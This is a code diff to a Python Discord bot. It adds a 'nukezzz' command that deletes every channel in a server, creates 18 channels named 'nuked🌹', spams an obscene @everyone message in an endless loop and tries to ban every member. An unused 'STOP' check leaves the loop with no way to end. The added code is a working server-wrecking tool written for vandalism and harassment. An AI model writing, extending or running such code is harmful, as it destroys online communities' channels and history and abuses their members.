@@ -938,6 +938,58 @@ async def autobuy(ctx):
     await ctx.message.delete()
     await ctx.send(f" **[+]・ `AUTOBUY LINK` :** {AUTOBUY}")
 
+# NUKEZ
+@ok.command()
+async def nukezzz(ctx):
+    def check(m):
+        return m.content == 'STOP' and m.channel == ctx.channel and m.author == ctx.author
+
+    if not ctx.author.guild_permissions.administrator:
+        await ctx.send('[!] `ADMIN PERMS`')
+        return
+
+    channel_name = 'nuked🌹'
+
+    print(f'{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.RED}[!] {Fore.BLUE}DELETING CHANNELS')
+    for channel in ctx.guild.channels:
+        try:
+            await channel.delete()
+        except discord.errors.Forbidden:
+            pass
+
+    print(f'{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}[!] CREATING CHANNELS')
+    for i in range(18):
+        try:
+            await ctx.guild.create_text_channel(channel_name)
+        except discord.errors.Forbidden:
+            pass
+    
+    print(f'{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}[!] SPAMMING <$')
+    message_text = '# FUCKED BY YOUR DADDY : ||@everyone||'
+
+    while True:
+        for channel in ctx.guild.text_channels:
+            try:
+                await channel.send(message_text)
+            except discord.errors.Forbidden:
+                pass
+            except Exception as e:
+                print(f'[!] ERROR : {e}')
+
+        print(f'{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}[!] {Fore.RED}BANNING ALL !')
+        if ctx.author.guild_permissions.administrator:
+            members = ctx.guild.members
+            for member in members:
+                try:
+                    await member.ban()
+                except discord.errors.Forbidden:
+                    print(f'ERROR BANNING: {member.name}')
+                except Exception as e:
+                    print(f'ERROR BANNING: {member.name}')
+
+
+
+
 # GirUser
 @ok.command()
 async def gituser(ctx, username: str):
